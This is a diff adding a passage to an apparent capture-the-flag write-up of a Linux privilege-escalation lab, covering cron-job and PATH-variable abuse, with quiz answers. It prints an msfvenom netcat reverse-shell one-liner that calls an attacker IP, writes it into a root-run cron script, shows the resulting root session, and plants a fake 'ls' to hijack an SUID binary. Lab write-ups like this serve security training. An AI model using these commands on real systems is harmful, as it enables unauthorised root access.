@@ -2067,6 +2067,300 @@ Now, type ":!sh" to open a shell! *No answer needed*
 
 ###  Exploiting Crontab 
 
+What is Cron?
+
+The Cron daemon is a long-running process that executes commands at specific dates and times. You can use this to schedule activities, either as one-time events or as recurring tasks. You can create a crontab file containing commands and instructions for the Cron daemon to execute.
+
+How to view what Cronjobs are active.
+
+We can use the command "cat /etc/crontab" to view what cron jobs are scheduled. This is something you should always check manually whenever you get a chance, especially if LinEnum, or a similar script, doesn't find anything.
+
+Format of a Cronjob
+
+Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job. 
+
+# = ID
+
+m = Minute
+
+h = Hour
+
+dom = Day of the month
+
+mon = Month
+
+dow = Day of the week
+
+user = What user the command will run as
+
+command = What command should be run
+
+For Example,
+
+#  m   h dom mon dow user  command
+
+17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
+
+How can we exploit this?
+
+We know from our LinEnum scan, that the file autoscript.sh, on user4's Desktop is scheduled to run every five minutes. It is owned by root, meaning that it will run with root privileges, despite the fact that we can write to this file. The task then is to create a command that will return a shell and paste it in this file. When the file runs again in five minutes the shell will be running as root.
+
+Let's do it!
+
+
+
+First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user4, with the password "password" *No answer needed*
+
+```
+┌──(kali㉿kali)-[~/Downloads/learning_shell]
+└─$ msfvenom -p cmd/unix/reverse_netcat lhost=10.11.81.220 lport=4444 R
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 90 bytes
+mkfifo /tmp/bxre; nc 10.11.81.220 4444 0</tmp/bxre | /bin/sh >/tmp/bxre 2>&1; rm /tmp/bxre
+
+user4@polobox:/home/user3$ echo "mkfifo /tmp/bxre; nc 10.11.81.220 4444 0</tmp/bxre | /bin/sh >/tmp/bxre 2>&1; rm /tmp/bxre" > /home/user4/Desktop/autoscript.sh
+
+──(kali㉿kali)-[~/Downloads/learning_shell]
+└─$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.11.81.220] from (UNKNOWN) [10.10.197.203] 33046
+ls
+Desktop
+Documents
+Downloads
+Music
+Pictures
+Public
+Templates
+Videos
+whoami
+root
+cd ..
+ls
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd.img
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+cd /root
+ls
+Desktop
+Documents
+Downloads
+Music
+Pictures
+Public
+Templates
+Videos
+cd /home
+ls
+user1
+user2
+user3
+user4
+user5
+user6
+user7
+user8
+
+```
+
+Now, on our host machine- let's create a payload for our cron exploit using msfvenom.  
+*No answer needed*
+What is the flag to specify a payload in msfvenom? *-p*
+
+Create a payload using: "msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R" *No answer needed*
+
+What directory is the "autoscript.sh" under? */home/user4/Desktop*
+
+Lets replace the contents of the file with our payload using: "echo [MSFVENOM OUTPUT] > autoscript.sh"
+
+After copying the code into autoscript.sh file we wait for cron to execute the file, and start our netcat listener using: "nc -lvnp 8888" and wait for our shell to land! *No answer needed*
+
+After about 5 minutes, you should have a shell as root land in your netcat listening session! Congratulations!  *No answer needed*
+
+### Exploiting PATH Variable 
+
+What is PATH?
+
+PATH is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs. When the user runs any command in the terminal, it searches for executable files with the help of the PATH Variable in response to commands executed by a user.
+
+It is very simple to view the Path of the relevant user with help of the command "echo $PATH".
+
+`echo $PATH`
+/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+```
+┌──(kali㉿kali)-[~]
+└─$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
+
+```
+
+How does this let us escalate privileges?
+
+Let's say we have an SUID binary. Running it, we can see that it’s calling the system shell to do a basic process like list processes with "ps". Unlike in our previous SUID example, in this situation we can't exploit it by supplying an argument for command injection, so what can we do to try and exploit this?
+
+We can re-write the PATH variable to a location of our choosing! So when the SUID binary calls the system shell to run an executable, it runs one that we've written instead!
+
+As with any SUID file, it will run this command with the same privileges as the owner of the SUID file! If this is root, using this method we can run whatever commands we like as root!
+
+Let's do it!
+
+```
+user4@polobox:/home/user3$ su user5
+Password: 
+Welcome to Linux Lite 4.4 user5
+ 
+Thursday 25 August 2022, 08:40:15
+Memory Usage: 334/1991MB (16.78%)
+Disk Usage: 6/217GB (3%)
+Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
+ 
+user5@polobox:/home/user3$ cd /home/user5
+user5@polobox:~$ ls
+Desktop    Downloads  Pictures  script     Videos
+Documents  Music      Public    Templates
+user5@polobox:~$ ./script
+Desktop    Downloads  Pictures  script     Videos
+Documents  Music      Public    Templates
+user5@polobox:~$ cd /tmp
+user5@polobox:/tmp$ echo "/bin/bash" > ls
+user5@polobox:/tmp$ chmod +x ls
+user5@polobox:/tmp$ ls
+ls
+systemd-private-27657f954ec44ad4bc14aa353c3c2eba-apache2.service-rvqolv
+systemd-private-27657f954ec44ad4bc14aa353c3c2eba-systemd-resolved.service-kDd8DM
+systemd-private-27657f954ec44ad4bc14aa353c3c2eba-systemd-timesyncd.service-NL9PV8
+vboxguest-Module.symvers
+user5@polobox:/tmp$ export PATH=/tmp:$PATH
+user5@polobox:/tmp$ cd /home/user5
+user5@polobox:~$ ls
+Welcome to Linux Lite 4.4 user5
+ 
+Thursday 25 August 2022, 09:08:45
+Memory Usage: 337/1991MB (16.93%)
+Disk Usage: 6/217GB (3%)
+Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
+ 
+user5@polobox:~$ ./script
+Welcome to Linux Lite 4.4 user5
+ 
+Thursday 25 August 2022, 09:09:19
+Memory Usage: 339/1991MB (17.03%)
+Disk Usage: 6/217GB (3%)
+Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
+ 
+root@polobox:~# 
+
+root@polobox:/root# /bin/ls
+Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
+
+user5@polobox:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH
+user5@polobox:~$ ls
+Desktop    Downloads  Pictures  script     Videos
+Documents  Music      Public    Templates
+
+user5@polobox:~$ cd /tmp
+user5@polobox:/tmp$ export PATH=/tmp:$PATH
+user5@polobox:/tmp$ ls
+Welcome to Linux Lite 4.4 user5
+ 
+Thursday 25 August 2022, 09:18:15
+Memory Usage: 340/1991MB (17.08%)
+Disk Usage: 6/217GB (3%)
+Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
+ 
+user5@polobox:/tmp$ cd /home/user5
+user5@polobox:~$ ./script
+Welcome to Linux Lite 4.4 user5
+ 
+Thursday 25 August 2022, 09:18:27
+Memory Usage: 342/1991MB (17.18%)
+Disk Usage: 6/217GB (3%)
+Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
+ 
+root@polobox:~# 
+
+user5@polobox:~$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:*/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games (after /tmp: and before /tmp:)
+user5@polobox:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH
+user5@polobox:~$ ls
+Desktop    Downloads  Pictures  script     Videos
+Documents  Music      Public    Templates
+user5@polobox:~$ 
+
+```
+
+Going back to our local ssh session, not the netcat root session, you can close that now, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user5, with the password "password" *No answer needed*
+
+Let's go to user5's home directory, and run the file "script". What command do we think that it's executing? *ls*
+
+
+Now we know what command to imitate, let's change directory to "tmp". 
+ *No answer needed*
+
+
+Now we're inside tmp, let's create an imitation executable. The format for what we want to do is:
+echo "[whatever command we want to run]" > [name of the executable we're imitating]
+What would the command look like to open a bash shell, writing to a file with the name of the executable we're imitating *echo "/bin/bash" > ls*
+
+Great! Now we've made our imitation, we need to make it an executable. What command do we execute to do this? *chmod +x ls*
+
+
+
+Now, we need to change the PATH variable, so that it points to the directory where we have our imitation "ls" stored! We do this using the command "export PATH=/tmp:$PATH"  *No answer needed*
+Note, this will cause you to open a bash prompt every time you use "ls". If you need to use "ls" before you finish the exploit, use "/bin/ls" where the real "ls" executable is.
+Once you've finished the exploit, you can exit out of root and use "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH" to reset the PATH variable back to default, letting you use "ls" again!
+*No answer needed*
+
+Now, change directory back to user5's home directory. *No answer needed*
+
+Now, run the "script" file again, you should be sent into a root bash prompt! Congratulations! *No answer needed*
+
+###  Expanding Your Knowledge 
+
+Further Learning
+
+There is never a "magic" answer in the huge area that is Linux Privilege Escalation. This is simply a few examples of basic things to watch out for when trying to escalate privileges.The only way to get better at it, is to practice and build up experience. Checklists are a good way to make sure you haven't missed anything during your enumeration stage, and also to provide you with a resource to check how to do things if you forget exactly what commands to use.
+
+Below is a list of good checklists to apply to CTF or penetration test use cases.Although I encourage you to make your own using CherryTree or whatever notes application you prefer.
+
+    https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
+    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+    https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
+    https://payatu.com/guide-linux-privilege-escalation
+
+Thank you
+
+Thanks for taking the time to work through this room, I wish you the best of luck in future.
+
+~ Polo
+
+
+
+
+Well done, you did it! *No answer needed*
 
 
 
